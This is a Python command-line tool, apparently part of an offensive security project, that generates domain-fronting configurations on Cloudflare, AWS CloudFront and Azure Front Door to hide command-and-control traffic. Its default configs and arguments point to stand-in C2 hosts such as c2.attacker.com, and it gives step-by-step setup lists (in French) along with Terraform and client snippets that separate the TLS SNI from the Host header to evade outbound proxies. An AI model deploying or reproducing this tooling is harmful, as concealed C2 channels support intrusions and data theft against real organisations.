from __future__ import annotations

import argparse
import json
import sys
import uuid
from pathlib import Path

_PROJECT_ROOT = Path(__file__).resolve().parents[2]
if str(_PROJECT_ROOT) not in sys.path:
    sys.path.insert(0, str(_PROJECT_ROOT))

from attack.domain_fronting.fronting import (
    CDNProvider,
    DomainFrontingConfig,
    FrontingRouter,
)

DEFAULT_CDN_CONFIGS = {
    "cloudflare": {
        "cdn": "cloudflare",
        "description": "Cloudflare Workers / CDN - Domain Borrowing via Workers",
        "default_front_domain": "cdn.cloudflare.com",
        "sni_separated": True,
        "host_header_separated": True,
        "required_config": {
            "worker_script": "cf-worker-proxy.js",
            "worker_route": "legit-subdomain.example.com/*",
            "origin_fetch_url": "https://c2.attacker.com",
        },
        "steps": [
            "Créer un Worker Cloudflare sur sous-domaine legit",
            "Le Worker fait un fetch() vers l'origine cachée",
            "Cloudflare ajoute automatiquement le domain fronting via Worker",
        ],
    },
    "aws": {
        "cdn": "aws",
        "description": "AWS CloudFront - Distribution avec origine custom",
        "default_front_domain": "distribution.cloudfront.net",
        "sni_separated": True,
        "host_header_separated": True,
        "required_config": {
            "distribution_id": "EXXXXXXXXXXXX",
            "origin_domain": "c2.attacker.com",
            "acm_certificate_arn": "arn:aws:acm:us-east-1:123456789012:certificate/XXXX",
            "aliases": ["cdn.legit-corp.com"],
        },
        "steps": [
            "Créer une distribution CloudFront avec origin = ALB/Domain custom",
            "Configurer le viewer protocol policy = HTTPS only",
            "Ajouter un CNAME DNS (cdn.legit-corp.com -> distribution.cloudfront.net)",
            "Configurer le cache behavior : origin = custom origin",
        ],
    },
    "azure": {
        "cdn": "azure",
        "description": "Azure Front Door / CDN - WAF routing vers origine",
        "default_front_domain": "azurefd.net",
        "sni_separated": True,
        "host_header_separated": True,
        "required_config": {
            "front_door_name": "legit-frontdoor",
            "backend_pool": "c2-backend-pool",
            "backend_host": "c2.attacker.com",
            "custom_domain": "cdn.legit-corp.com",
        },
        "steps": [
            "Créer un profil Azure Front Door Premium",
            "Ajouter un endpoint avec custom domain legit",
            "Configurer un origin group pointant vers l'infrastructure C2",
            "Ajouter une route qui forward le Host header custom",
        ],
    },
}


def cmd_list_cdn(_args: argparse.Namespace) -> int:
    print(json.dumps(DEFAULT_CDN_CONFIGS, indent=2))
    return 0


def cmd_check(args: argparse.Namespace) -> dict:
    cdn = args.cdn
    backend = args.backend
    dry_run = args.dry_run

    cdn_config = DEFAULT_CDN_CONFIGS.get(cdn)
    if not cdn_config:
        return {
            "valid": False,
            "cdn": cdn,
            "backend": backend,
            "dry_run": dry_run,
            "errors": [f"CDN '{cdn}' non supporté"],
        }

    errors: list[str] = []

    if not backend or not backend.startswith(("http://", "https://")):
        errors.append("backend URL doit commencer par http:// ou https://")

    if cdn == "cloudflare":
        if ".workers.dev" not in backend and "cloudflare" not in backend:
            errors.append(
                "Cloudflare: backend typiquement sur *.workers.dev ou domaine proxifié"
            )
    elif cdn == "aws":
        if "cloudfront" not in backend and ".amazonaws.com" not in backend:
            errors.append(
                "AWS CloudFront: backend typiquement *.cloudfront.net ou ELB"
            )
    elif cdn == "azure":
        if "azurefd" not in backend and "azure" not in backend:
            errors.append(
                "Azure Front Door: backend typiquement *.azurefd.net ou App Service"
            )

    valid = len(errors) == 0

    result = {
        "valid": valid,
        "cdn": cdn,
        "backend": backend,
        "dry_run": dry_run,
        "sni_header_separation": {
            "sni": cdn_config["default_front_domain"],
            "host_header_from_backend": backend,
            "supported": cdn_config["sni_separated"] and cdn_config["host_header_separated"],
        },
        "default_config": cdn_config["required_config"],
        "errors": errors,
    }

    print(json.dumps(result, indent=2))
    return 0 if valid else 1


def cmd_deploy(args: argparse.Namespace) -> int:
    router = FrontingRouter()

    try:
        cdn_provider = CDNProvider(args.cdn)
    except ValueError:
        cdn_provider = CDNProvider.CLOUDFRONT

    front_domain = args.front_domain or DEFAULT_CDN_CONFIGS.get(
        args.cdn, {}
    ).get("default_front_domain", "cdn.example.com")
    real_host = args.real_host or args.backend.replace("https://", "").replace("http://", "").split("/")[0]

    cfg = router.create_config(
        cdn=cdn_provider,
        front_domain=front_domain,
        real_host_header=real_host,
        c2_path_prefix=args.path_prefix,
        origin_domain=args.backend,
        notes=args.notes or "",
    )

    deploy_obj = {
        "deployment_id": str(uuid.uuid4()),
        "config_id": cfg.config_id,
        "cdn": cfg.cdn.value,
        "sni": {
            "server_name": cfg.front_domain,
            "description": "SNI TLS visible par les proxies sortants",
        },
        "host_header": {
            "value": cfg.real_host_header,
            "description": "Host header HTTP envoyé au CDN pour routing interne",
        },
        "separation_enabled": True,
        "c2_path_prefix": cfg.c2_path_prefix,
        "origin_backend": cfg.origin_domain or args.backend,
        "terraform_snippet": router.export_terraform(cfg),
        "client_config_snippet": router.export_client_config(cfg),
        "deploy_steps": router.get_guide(cfg.cdn).get("steps", []),
        "created_at": cfg.created_at,
    }

    output_path = Path(args.output)
    output_path.parent.mkdir(parents=True, exist_ok=True)
    output_path.write_text(json.dumps(deploy_obj, indent=2), encoding="utf-8")

    print("✅ Configuration de domain fronting générée")
    print(f"   CDN           : {cfg.cdn.value}")
    print(f"   SNI (visible) : {cfg.front_domain}")
    print(f"   Host header   : {cfg.real_host_header}")
    print(f"   Fichier       : {output_path}")
    return 0


def main() -> int:
    parser = argparse.ArgumentParser(
        description="Domain Fronting CLI - Déploiement et vérification de setup CDN",
    )
    subparsers = parser.add_subparsers(dest="command", required=True)

    list_cdn_p = subparsers.add_parser(
        "list-cdn", help="Affiche les configurations par défaut Cloudflare/AWS/Azure"
    )
    list_cdn_p.set_defaults(func=cmd_list_cdn)

    check_p = subparsers.add_parser(
        "check", help="Vérifie si une configuration CDN + backend est valide"
    )
    check_p.add_argument(
        "--cdn",
        type=str,
        required=True,
        choices=["cloudflare", "aws", "azure"],
        help="Type de CDN",
    )
    check_p.add_argument(
        "--backend",
        type=str,
        required=True,
        help="URL de l'origine backend (https://c2.example.com)",
    )
    check_p.add_argument(
        "--dry-run",
        action="store_true",
        default=True,
        help="Mode simulation (défaut: True)",
    )
    check_p.set_defaults(func=cmd_check)

    deploy_p = subparsers.add_parser(
        "deploy", help="Génère un objet JSON de config avec SNI/Host séparés"
    )
    deploy_p.add_argument(
        "--cdn",
        type=str,
        required=True,
        choices=["cloudflare", "aws", "azure"],
        help="Type de CDN",
    )
    deploy_p.add_argument(
        "--front-domain",
        type=str,
        default=None,
        help="Domaine front pour le SNI (SNI visible)",
    )
    deploy_p.add_argument(
        "--real-host",
        type=str,
        default=None,
        help="Valeur réelle du Host header (origine cachée)",
    )
    deploy_p.add_argument(
        "--backend",
        type=str,
        default="https://c2.attacker.example.invalid",
        help="URL backend de l'origine C2",
    )
    deploy_p.add_argument(
        "--path-prefix",
        type=str,
        default="/api/v1",
        help="Préfixe de chemin C2",
    )
    deploy_p.add_argument(
        "--notes",
        type=str,
        default="",
        help="Notes sur le déploiement",
    )
    deploy_p.add_argument(
        "--output",
        "-o",
        type=str,
        default="captures/fronting/deploy.json",
        help="Fichier JSON de sortie",
    )
    deploy_p.set_defaults(func=cmd_deploy)

    args = parser.parse_args()
    return args.func(args)


if __name__ == "__main__":
    sys.exit(main())
